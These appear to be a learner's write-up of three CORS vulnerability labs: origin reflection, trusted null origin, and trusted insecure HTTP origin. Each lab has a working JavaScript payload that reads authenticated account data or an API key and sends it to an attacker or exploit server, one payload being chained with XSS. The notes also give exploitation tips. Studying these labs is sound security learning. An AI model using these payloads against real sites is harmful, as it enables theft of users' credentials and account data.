	# CORS Vulnerabilities

##  What is CORS?

Many modern websites use CORS to allow access from subdomains and trusted third parties. However, misconfigurations or overly permissive settings can lead to **serious security vulnerabilities**.

---

#  Lab: CORS Vulnerability with Basic Origin Reflection

##  Goal

Craft JavaScript that:

- Retrieves the **administrator’s API key**
- Sends it to your exploit server

---

##  Approach

<script>  
var r = new XMLHttpRequest();  
r.open('GET','https://0ac8005903f5ea3481f3ec5501e80056.web-security-academy.net/accountDetails', false);  
r.withCredentials = true;  
r.send();  
  
const obj = JSON.parse(r.responseText);  
  
var v2 = new XMLHttpRequest();  
v2.open('GET','https://0ac8005903f5ea3481f3ec5501e80056.web-security-academy.net/?user=' + obj.username + '&apikey=' + obj.apikey, false);  
v2.send();  
</script>

---

#  Lab: CORS Vulnerability with Trusted Null Origin

##  Vulnerability

Server configuration:

Access-Control-Allow-Origin: null  
Access-Control-Allow-Credentials: true

👉 The server **trusts `Origin: null` and allows cookies**

---

##  Key Concept: Origin `null`

Occurs in:

- `sandboxed iframes`
- `file://` protocol
- `data:` URLs

---

##  Exploit Flow

1. Create sandboxed iframe → forces `Origin: null`
2. Send authenticated request:

fetch('https://target.com/accountDetails', {  
  credentials: 'include'  
})

3. Server allows request
4. Read response
5. Exfiltrate data

---

## Working Payload

<iframe sandbox="allow-scripts" srcdoc="  
<script>  
fetch('https://target.com/accountDetails',{credentials:'include'})  
.then(r=>r.text())  
.then(d=>new Image().src='https://attacker.com/log?x='+btoa(d));  
</script>  
"></iframe>

---

##  Why This Works

**Request:**

Origin: null  
Cookie: session=...

**Response:**

Access-Control-Allow-Origin: null  
Access-Control-Allow-Credentials: true

 Browser allows JS to read response

---

##  Common Mistakes

- Missing `https://`
- Extra sandbox flags
- Not using `credentials: include`
- Using `location=` instead of `Image()`
- Not encoding response (`btoa`)

---

##  Real-World Exploitation

You need:

- CORS misconfiguration
- JS execution (XSS / HTML Injection / attacker-controlled page)

---

##  Key Takeaways

- CORS is enforced by the **browser**, not the server
- `null` origin is dangerous if trusted
- Exploit pattern:
    
    fetch → read → exfiltrate
    
- No XSS needed if you control attacker page

---

##  Pro Tips

- Always test:
    
    Origin: null
    
- Try multiple endpoints
- Use Base64 (`btoa`)
- Prefer `fetch()` over XHR

---

##  Mental Model

> “If server trusts null → become null → steal data”

---

#  Lab: CORS Vulnerability with Trusted Insecure Protocols

##  Vulnerability

Server configuration:

Access-Control-Allow-Origin: http://stock.<lab-id>  
Access-Control-Allow-Credentials: true

Server trusts an **HTTP (insecure) origin**

---

##  Core Issue

- Main site runs on **HTTPS**
- Trusted origin is **HTTP**
- HTTP is insecure → attacker can inject JS

 Leads to **CORS trust bypass**

---

##  Additional Vulnerability

http://stock.<lab-id>/?productId=1&storeId=1

`productId` is vulnerable to **XSS**

---

##  Exploit Chain

1. Redirect victim to stock domain
2. Inject XSS in `productId`
3. JS executes under:
    
    Origin: http://stock.<lab-id>
    
4. Send authenticated request:

req.open('GET','https://<lab-id>/accountDetails', true);  
req.withCredentials = true;

5. Read response
6. Exfiltrate data

---

##  Working Payload

<script>  
document.location = "http://stock.<lab-id>/?productId=1<script>  
var req = new XMLHttpRequest();  
req.onload = reqListener;  
req.open('GET','https://<lab-id>/accountDetails', true);  
req.withCredentials = true;  
req.send();  
  
function reqListener(){  
  location='https://exploit-server/log?key=' + encodeURIComponent(this.responseText);  
};  
</script>&storeId=1"  
</script>

---

##  Why It Works

**Request:**

Origin: http://stock.<lab-id>  
Cookie: session=...

**Response:**

Access-Control-Allow-Origin: http://stock.<lab-id>  
Access-Control-Allow-Credentials: true

👉 Browser allows response access

---

##  Key Differences

|Lab Type|Technique|
|---|---|
|Null Origin|Sandbox iframe|
|Insecure Protocol|XSS on trusted HTTP origin|

---

##  Common Mistakes

- Trying iframe control (blocked by SOP)
- Using null origin unnecessarily
- Missing XSS on trusted origin
- Broken payload encoding

---

##  What You Should Learn

### 1. Vulnerability Chaining

CORS alone ≠ exploitable  
Needs execution context (XSS / control)

---

### 2. HTTP is Dangerous

If server trusts:

http://subdomain

 attacker can inject JS

---

### 3. Origin > Location

It’s not where payload is  
 It’s where it **executes**

---

### 4. SOP vs CORS

- SOP → blocks cross-origin access
- CORS → allows access (if misconfigured)

---

### 5. Real-World Thinking

When you see CORS:

- Find trusted origin
- Check if exploitable (XSS, HTTP, takeover)
- Chain vulnerabilities

---

##  Mental Model

> “Find trusted origin → execute JS → abuse CORS → steal data”

---

##  Pro Tips

- Test all subdomains
- Check HTTP vs HTTPS
- Look for XSS on trusted origins
- Always use `withCredentials = true`